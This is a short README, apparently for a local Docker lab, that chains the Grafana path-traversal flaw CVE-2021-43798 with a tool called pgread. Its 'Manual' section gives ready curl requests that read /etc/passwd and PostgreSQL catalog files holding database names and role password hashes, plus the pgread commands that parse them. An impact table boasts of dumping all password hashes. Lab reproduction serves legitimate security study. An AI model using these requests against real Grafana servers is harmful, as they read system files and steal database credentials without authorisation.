# CVE-2021-43798 + pgread Lab

**LFI Grafana → Dump PostgreSQL sans credentials**

## Setup

```bash
docker-compose up -d
```

## Exploit

```bash
chmod +x exploit.sh
./exploit.sh http://localhost:3000
```

## Manual

```bash
# 1. Test LFI
curl "http://localhost:3000/public/plugins/alertlist/../../../../../../../../etc/passwd"

# 2. Dump pg_database
curl "http://localhost:3000/public/plugins/alertlist/../../../../../../../../var/lib/postgresql/data/global/1262" -o 1262
pgread -f 1262

# 3. Dump password hashes
curl "http://localhost:3000/public/plugins/alertlist/../../../../../../../../var/lib/postgresql/data/global/1260" -o 1260
pgread -f 1260
```

## Impact

| Avant pgread | Avec pgread |
|--------------|-------------|
| LFI = Medium | LFI = **Critical** |
| "I can read /etc/passwd" | "I dumped all password hashes" |
